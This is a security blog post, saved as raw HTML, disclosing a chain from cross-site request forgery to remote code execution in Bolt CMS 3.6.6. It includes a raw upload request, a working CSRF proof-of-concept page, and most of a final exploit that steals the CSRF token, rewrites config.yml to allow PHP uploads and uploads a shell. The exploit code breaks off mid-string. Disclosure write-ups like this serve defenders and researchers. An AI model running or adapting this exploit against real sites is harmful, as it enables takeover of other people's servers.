<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="From CSRF to RCE" /><meta name="author" content="Felipe Gaspar" /><meta property="og:locale" content="en_US" /><meta name="description" content="A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a “Sophisticated, lightweight &amp; simple CMS”." /><meta property="og:description" content="A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a “Sophisticated, lightweight &amp; simple CMS”." /><link rel="canonical" href="https://fgsec.net/posts/From-CSRF-to-RCE/" /><meta property="og:url" content="https://fgsec.net/posts/From-CSRF-to-RCE/" /><meta property="og:site_name" content="Fgsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-19T13:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="From CSRF to RCE" /><meta name="twitter:site" content="@felipegaspar" /><meta name="twitter:creator" content="@Felipe Gaspar" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Felipe Gaspar"},"description":"A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a “Sophisticated, lightweight &amp; simple CMS”.","url":"https://fgsec.net/posts/From-CSRF-to-RCE/","@type":"BlogPosting","headline":"From CSRF to RCE","dateModified":"2021-02-13T00:55:40-03:00","datePublished":"2020-04-19T13:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://fgsec.net/posts/From-CSRF-to-RCE/"},"@context":"https://schema.org"}</script><title>From CSRF to RCE | Fgsec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-175924413-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-175924413-1'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/25889166?s=460&u=f308a01d882082a7c6ca2e2b00858a8de9e3b20a" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Fgsec</a></div><div class="site-subtitle font-italic">So long, and Thanks for All the Fish.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/fgsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/felipegaspar" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['dontknowmyemail',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>From CSRF to RCE</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>From CSRF to RCE</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 19, 2020, 1:00 PM -0300" > Apr 19, 2020 <i class="unloaded">2020-04-19T13:00:00-03:00</i> </span> by <span class="author"> Felipe Gaspar </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 13, 2021, 12:55 AM -0300" > Feb 13 <i class="unloaded">2021-02-13T00:55:40-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1295 words">7 min</span></div></div><div class="post-content"><p>A few days ago I started taking interest in Bolt, a content management that quoting from its github, is a “<a href="https://bolt.cm/">Sophisticated, lightweight &amp; simple CMS</a>”.</p><p>The team behind it really did a great job in making the CMS easy to use, and packed with a lot of features. I truly recommend you checking out their project if you are looking for a cool new CMS to use.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/2020-40-20-From-CSRF-to-RCE_01.png" /></p><h2 id="affected-version">Affected Version</h2><p>Bolt CMS 3.6.6 - It is possible that lower versions are vulnerable as well.</p><h2 id="explanation">Explanation</h2><p>It is common to find some vulnerabilities that alone don’t actually create a good case, like CSRF and some types of XSS, so it’s up to the attacker to make use of them and create creative ways to chain attacks.</p><p>In this post, I will be showing how it was possible to obtain Remote Code Execution through a Cross Site Request Forgery in Bolt CMS.</p><h2 id="starting-with-csrf">Starting with CSRF</h2><p>This flaw exists in the file upload section called “Files on the Stack”, available for users that can manage content for the Homepage, Pages, Entries and Blocks.</p><p>You may think, CSRF on file upload? What can I do with this? Can I pwn the server sending PHP? No, BUT you can upload HTML files!</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/bolt/upload</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">victim.com</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://victim.com/bolt/editcontent/homepage</span>
<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">227</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------6228775941835128519569528722</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="s">-----------------------------6228775941835128519569528722</span>
<span class="na">Content-Disposition</span><span class="p">:</span> <span class="s">form-data; name="files[]"; filename="test.html"</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/markdown</span>

&lt;html&gt;&lt;script&gt;alert("hi");&lt;/script&gt;&lt;/html&gt;

-----------------------------6228775941835128519569528722--
</pre></table></code></div></div><p>This means that we, attackers, can execute arbitrary JavaScript in the same context as the application with the authenticated user privileges, which you will see how important it is for the attack.</p><p>A simple code to exploit CSRF and upload an HTML file is provided below (with the help of Burp Pro), it will upload a “test.html” file that can be located in a default path for every bolt installation: “/files/YEAR-MONTH” in my case: “victim.com/files/2019-04/test.html”:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/127.0.0.1</span><span class="se">\</span><span class="s2">/bolt</span><span class="se">\</span><span class="s2">/upload</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application</span><span class="se">\</span><span class="s2">/json, text</span><span class="se">\</span><span class="s2">/javascript, *</span><span class="se">\</span><span class="s2">/*; q=0.01</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">en-US,en;q=0.5</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">multipart</span><span class="se">\</span><span class="s2">/form-data; boundary=---------------------------6228775941835128519569528722</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">-----------------------------6228775941835128519569528722</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">files[]</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"</span><span class="s2">test.html</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Type: text/markdown</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\</span><span class="s2">x3chtml</span><span class="se">\</span><span class="s2">x3e</span><span class="se">\</span><span class="s2">x3cscript</span><span class="se">\</span><span class="s2">x3ealert(</span><span class="se">\"</span><span class="s2">hi</span><span class="se">\"</span><span class="s2">);</span><span class="se">\</span><span class="s2">x3c/script</span><span class="se">\</span><span class="s2">x3e</span><span class="se">\</span><span class="s2">x3c/html</span><span class="se">\</span><span class="s2">x3e</span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">-----------------------------6228775941835128519569528722--</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span> 
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="na">onclick=</span><span class="s">"submitRequest();"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><h2 id="about-the-rce">About the RCE</h2><p>Now comes the fun stuff, finding a vulnerability or a legitimate way to obtain remote code execution.</p><p>Looking for known vulnerabilities in the code did not result in anything interesting, at least for the time I spent in the analysis. When looking into some of the features available for privileged users, I discovered one that allows changes in a configuration file that controls what variables are allowed to be uploaded in the application.</p><p>The feature in question can be accessed inside the settings menu on “Configuration” and then “Main Configuration”, or by accessing it directly: “/bolt/file/edit/config/config.yml”</p><figure class="highlight"><pre><code class="language-text" data-lang="text"># Define the file types (extensions to be exact) that are acceptable for upload
# in either 'file' fields or through the 'files' screen.
accept_file_types: [ twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg]</code></pre></figure><p>As you see, an attacker with this level of access is able to bypass upload restrictions without much effort by including “php” extension inside the “accept_file_types” list.</p><p>Now, any file upload feature can be used to achieve our goal.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/2020-40-20-From-CSRF-to-RCE_02.png" /></p><h2 id="proof-of-concept">Proof of Concept</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/2020-40-20-From-CSRF-to-RCE_03.png" /></p><p>Our exploration will have the following path:</p><ol><li>Victim access attacker’s URL<li>Victim Browser attemps to upload our “stager” HTML file<li>Victim is redirected to our stager page inside the server<li>Stager makes three requests:<ol><li>Obtain request token to bypass CSRF protection<li>Use token to change allowed types list<li>Upload our Shell</ol><li>Attacker waits for shell with popcorn</ol><iframe width="912" height="513" src="https://www.youtube.com/embed/axwXrNyG4wI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><h1 id="final-exploit">Final Exploit</h1><p>https://www.exploit-db.com/exploits/46664</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>

        <span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://127.0.0.1</span><span class="dl">"</span>

        <span class="kd">var</span> <span class="nx">bolt_admin_url</span> <span class="o">=</span> <span class="nx">target</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/bolt</span><span class="dl">"</span><span class="p">;</span>

        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">bolt_admin_url</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/upload</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application</span><span class="se">\</span><span class="s2">/json, text</span><span class="se">\</span><span class="s2">/javascript, *</span><span class="se">\</span><span class="s2">/*; q=0.01</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">en-US,en;q=0.5</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">multipart</span><span class="se">\</span><span class="s2">/form-data; boundary=---------------------------130713229751679908527494159</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">-----------------------------130713229751679908527494159</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">files[]</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"</span><span class="s2">stager.html</span><span class="se">\"\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">Content-Type: text/plain</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\</span><span class="s2">x3cscript</span><span class="se">\</span><span class="s2">x3e</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">function exploit(){</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        var bolt_admin_url = </span><span class="se">\"</span><span class="dl">"</span><span class="o">+</span><span class="nx">bolt_admin_url</span><span class="o">+</span><span class="dl">"</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        var xhr = new XMLHttpRequest();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        </span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        if(xhr) {</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.open(</span><span class="se">\</span><span class="s2">'GET</span><span class="se">\</span><span class="s2">', bolt_admin_url + </span><span class="se">\"</span><span class="s2">/file/edit/config/config.yml</span><span class="se">\"</span><span class="s2">, true);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.onreadystatechange = handler;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.send();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        function handler(){</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">          if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) {</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                user_page = document.createElement(</span><span class="se">\</span><span class="s2">'html</span><span class="se">\</span><span class="s2">');</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                user_page.innerHTML = xhr.responseText;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                token_input = (user_page.getElementsByTagName(</span><span class="se">\</span><span class="s2">'input</span><span class="se">\</span><span class="s2">')[0]).value;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                console.log(</span><span class="se">\"</span><span class="s2">Token obtained:</span><span class="se">\"</span><span class="s2"> + token_input);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                ModifyAllowedExtensions(token_input);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">                UploadShell();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">          }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        }</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">        function ModifyAllowedExtensions(token) {</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var xhr = new XMLHttpRequest();</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.open(</span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">, bolt_admin_url + </span><span class="se">\"</span><span class="s2">/file/edit/config/config.yml</span><span class="se">\"</span><span class="s2">, true);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Accept</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">application</span><span class="se">\\</span><span class="s2">/json, text</span><span class="se">\\</span><span class="s2">/javascript, *</span><span class="se">\\</span><span class="s2">/*; q=0.01</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Accept-Language</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">en-US,en;q=0.5</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.setRequestHeader(</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">application/x-www-form-urlencoded</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            xhr.withCredentials = true;</span><span class="se">\r\n</span><span class="dl">"</span> <span class="o">+</span> 
          <span class="dl">"</span><span class="s2">            var body = </span><span class="se">\"</span><span class="s2">file_edit%5B_token%5D=</span><span class="se">\"</span><span class="s2">+token+</span><span class="se">\"</span><span class="s2">&amp;file_edit%5Bcontents%5D=%23+Database+setup.+The+driver+can+be+either+</span><span class="se">\\\</span><span class="s2">'sqlite</span><span class="se">\\\</span><span class="s2">'%2C+</span><span class="se">\\\</span><span class="s2">'mysql</span><span class="se">\\\</span><span class="s2">'+or+</span><span class="se">\\\</span><span class="s2">'postgres</span><span class="se">\\\</span><span class="s2">'.%0D%0A%23%0D%0A%23+For+SQLite%2C+only+the+databasename+is+required.+However%2C+MySQL+and+PostgreSQL%0D%0A%23+also+require+</span><span class="se">\\\</span><span class="s2">'username</span><span class="se">\\\</span><span class="s2">'%2C+</span><span class="se">\\\</span><span class="s2">'password</span><span class="se">\\\</span><span class="s2">'%2C+and+optionally+</span><span class="se">\\\</span><span class="s2">'host</span><span class="se">\\\</span><span class="s2">'+(+and+</span><span class="se">\\\</span><span class="s2">'port</span><span class="se">\\\</span><span class="s2">'+)+if+the+database%0D%0A%23+server+is+not+on+the+same+host+as+the+web+server.%0D%0A%23%0D%0A%23+If+you</span><span class="se">\\\</span><span class="s2">'re+trying+out+Bolt%2C+just+keep+it+set+to+SQLite+for+now.%0D%0Adatabase%3A%0D%0A++++driver%3A+sqlite%0D%0A++++databasename%3A+bolt%0D%0A%0D%0A%23+The+name+of+the+website%0D%0Asitename%3A+A+sample+site%0D%0Apayoff%3A+The+amazing+payoff+goes+here%0D%0A%0D%0A%23+The+theme+to+use.%0D%0A%23%0D%0A%23+Don</span><span class="se">\\\</span><span class="s2">'t+edit+the+provided+templates+directly%2C+because+they+_will_+get+updated%0D%0A%23+in+next+releases.+If+you+wish+to+modify+a+default+theme%2C+copy+its+folder%2C+and%0D%0A%23+change+the+name+here+accordingly.%0D%0Atheme%3A+base-2018%0D%0A%0D%0A%23+The+locale+that</span><span class="se">\\\</span><span class="s2">'ll+be+used+by+the+application.+If+no+locale+is+set+the%0D%0A%23+fallback+locale+is+</span><span class="se">\\\</span><span class="s2">'en_GB</span><span class="se">\\\</span><span 